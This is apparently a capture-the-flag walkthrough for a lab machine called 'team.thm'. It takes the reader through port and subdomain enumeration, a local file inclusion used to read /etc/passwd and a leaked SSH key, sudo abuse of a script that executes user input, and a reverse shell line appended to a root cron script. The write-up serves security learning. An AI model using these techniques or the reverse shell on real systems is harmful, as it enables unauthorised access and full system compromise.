Like I always do, I pinged the box to make sure my VPN was working and I had a connection to the box.
```
sudo ping -c4 10.10.28.97
PING 10.10.28.97 (10.10.28.97) 56(84) bytes of data.
64 bytes from 10.10.28.97: icmp_seq=1 ttl=63 time=55.6 ms
64 bytes from 10.10.28.97: icmp_seq=2 ttl=63 time=55.9 ms
64 bytes from 10.10.28.97: icmp_seq=3 ttl=63 time=57.2 ms
64 bytes from 10.10.28.97: icmp_seq=4 ttl=63 time=55.6 ms
```

I like to start with a basic Nmap scan with -p- option to check for every port from the range 1-65535.
```
sudo nmap -p- 10.10.28.97
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 10:14 EET
Nmap scan report for 10.10.28.97
Host is up (0.059s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 105.51 seconds
```

There are three ports open. FTP server on port 21, SSH on port 22, and an HTTP server on port 80.
Now I know the ports that those are open so I will do a more aggressive scan on the specific ports.
````
nmap -sVC -p21,22,80 10.10.28.97
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 10:20 EET
Nmap scan report for team.thm (10.10.28.97)
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Team
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
````

The FTP server does not have Anonymous login enabled so I can't use that to enumerate files in there.
As I don't have any username for FTP or SSH I'm not going to bruteforce them as it's most probably just a waste of time.
I also used 
````
nmap -sVC --script vuln,default,safe,version -p21,22,80 10.10.28.97
````
to further enumerate the target.
I'm not going to copy it here as it's very long but at the bottom, it reads: "|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te..."
Let's use curl to see what was snipped out of the line.
````
curl http://10.10.28.97
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
    <style type="text/css" media="screen">
-----SNIP-----
````

So I should be adding "team.thm" to my "/etc/hosts" file. Let's do that.
I just used Nano to edit a line "10.10.28.97     team.thm" to my /etc/hosts file.
Looking at the team.thm with the browser it looks like a portfolio site. I did search the site for a while but there really is nothing interesting.
I checked if there is a "robots.txt" file with curl and it just reads: "dale"
Let's use Feroxbuster to find possible directories.
````
feroxbuster -u http://team.thm

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://team.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      270c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      305c http://team.thm/images => http://team.thm/images/
200      GET        2l      122w    12086c http://team.thm/assets/js/jquery.poptrox.min.js
200      GET       83l      344w    25594c http://team.thm/images/avatar.jpg
200      GET       68l      398w    30497c http://team.thm/images/thumbs/02.jpg
200      GET        4l     1328w    85630c http://team.thm/assets/js/jquery.min.js
200      GET      340l     2497w   190327c http://team.thm/images/fulls/02.jpg
200      GET      667l     4137w   385779c http://team.thm/images/fulls/06.jpg
200      GET      629l     5746w   460566c http://team.thm/images/fulls/07.jpg
200      GET      682l     5545w   435772c http://team.thm/images/fulls/01.jpg
301      GET        9l       28w      305c http://team.thm/assets => http://team.thm/assets/
301      GET        9l       28w      311c http://team.thm/assets/fonts => http://team.thm/assets/fonts/
301      GET        9l       28w      306c http://team.thm/scripts => http://team.thm/scripts/
200      GET        2l      140w     9091c http://team.thm/assets/js/skel.min.js
200      GET       49l      104w     1187c http://team.thm/assets/js/main.js
200      GET      215l      894w    63455c http://team.thm/images/thumbs/01.jpg
200      GET      108l      569w    49803c http://team.thm/images/thumbs/03.jpg
200      GET      143l      857w    75438c http://team.thm/images/thumbs/07.jpg
200      GET      165l      970w    77815c http://team.thm/images/thumbs/06.jpg
200      GET      190l     1056w    85162c http://team.thm/images/thumbs/04.jpg
200      GET     2638l     5483w    43873c http://team.thm/assets/css/main.css
200      GET      270l     1248w   100684c http://team.thm/images/thumbs/05.jpg
200      GET      589l     4103w   114504c http://team.thm/images/bg.jpg
200      GET      768l     3288w   289688c http://team.thm/images/fulls/03.jpg
200      GET      936l     5352w   414661c http://team.thm/images/fulls/04.jpg
200      GET     1251l     6473w   521746c http://team.thm/images/fulls/05.jpg
200      GET       89l      220w     2966c http://team.thm/
301      GET        9l       28w      308c http://team.thm/assets/js => http://team.thm/assets/js/
301      GET        9l       28w      309c http://team.thm/assets/css => http://team.thm/assets/css/
[####################] - 88s   180061/180061  0s      found:28      errors:412
[####################] - 88s    30000/30000   342/s   http://team.thm/
[####################] - 6s     30000/30000   4950/s  http://team.thm/images/ => Directory listing
[####################] - 84s    30000/30000   359/s   http://team.thm/assets/
[####################] - 85s    30000/30000   352/s   http://team.thm/assets/js/
[####################] - 83s    30000/30000   359/s   http://team.thm/assets/css/
[####################] - 84s    30000/30000   357/s   http://team.thm/assets/fonts/
[####################] - 82s    30000/30000   364/s   http://team.thm/scripts/
[####################] - 0s     30000/30000   107914/s http://team.thm/images/thumbs/ => Directory listing
[####################] - 1s     30000/30000   40486/s http://team.thm/images/fulls/ => Directory listing
````

As I figured earlier nothing really that interesting.
Let's then use ffuf to find subdomains.
````
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 80 -H "Host: FUZZ.team.thm" -u http://10.10.28.97 -fs 11366

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.28.97
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.team.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11366
________________________________________________

www                     [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 58ms]
dev                     [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 109ms]
www.dev                 [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 60ms]
:: Progress: [114441/114441] :: Job [1/1] :: 735 req/sec :: Duration: [0:01:30] :: Errors: 0 ::
````

Well, that's more interesting. As this is a subdomain it needs also to be added to the /etc/hosts file.
The host file should look like this now:
````
# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateHosts = false
127.0.0.1       localhost
127.0.1.1       DESKTOP-S16G0DL.        DESKTOP-S16G0DL
10.10.28.97     team.thm dev.team.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
````

I could use a browser to check the site but I'm trying to get better with CLI so I just used curl.
````
curl http://dev.team.thm
<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>
````

The site has a link to a "script.php?page=teamshare.php". The site just has the line "Place holder for future team share".
Script.php uses the "page=" parameter to load the "teamshare.php" file and it might be vulnerable to LFI.
LFI is easy to test by trying to load a file that every Linux OS has, "/etc/passwd".
````
curl http://dev.team.thm/script.php?page=../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
````

This confirms that there is a working LFI. There is a "Dale" user with ID 1000 so I will start with that.
I also confirmed that the "Dale" user has a home folder with curl.
````
curl http://dev.team.thm/script.php?page=../../../../../../../../../home/dale/.bashrc

# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
-----SNIP-----
````

I then tried to curl for "/home/dale/.ssh/id_rsa" but sadly it returned nothing so the file does not exist.
I wanted to automate querying of the files so I used ffuf to do that.
````
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -t 80 -u http://dev.team.thm/script.php?page=../../../../../../../../..FUZZ -fs 1
````
Returns a number of files and after looking at a few of them I checked the "/etc/ssh/sshd_config" which at the bottom contained the dale user id_rsa file.
I copied it to a file and removed all the "#"s before the key. I used "chmod 600 id_rsa_dale" to modify the permissions of the file so I wouldn't the an error about unprotected private key file.
Now I should be able to log in using "ssh -i id_rsa_dale dale@10.10.10.28.97".
````
dale@TEAM:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
````

One of the first things I do when getting into a box is to check if I can run anything with sudo.
````
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
````

So I'm able to run the "admin_checks" file as a "gyles" user. 
````
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
````

The file is a simple bash script that has a problem with error handling. 
"read -p "Enter 'date' to timestamp the file: " error" line expects input "date" but if you input anything else it will execute it as a command.
So if I put "/bin/bash" it will execute it and as I'm using the script as "gyles" it will spawn a shell as Gyles!
````
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
teReading stats..
Enter name of person backing up the data: test1
Enter 'date' to timestamp the file: /bin/bash
The Date is test2
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
````

Using "sudo -l" requires a password, which I don't have but the user is part of the "admin" group.
````
find / -group admin -type f 2>/dev/null
````
Searches if group "admin" has any files that belong to the group.
There is one  "/usr/local/bin/main_backup.sh"
````
cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
````

The script is a backup script so it probably runs every once and a while.
As I can edit the file I can echo reverse shell into the file(or use nano etc.).
"echo "/bin/bash -i >& /dev/tcp/10.10.10.10/1234 0>&1" >> /usr/local/bin/main_backup.sh"

I can then start a ncat listener and should get a reverse shell as a root user!
````
kali@kali:~$ ncat -lvnp 1234
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.28.97:50120.
bash: cannot set terminal process group (1384): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# whoami
whoami
root
root@TEAM:~#
````













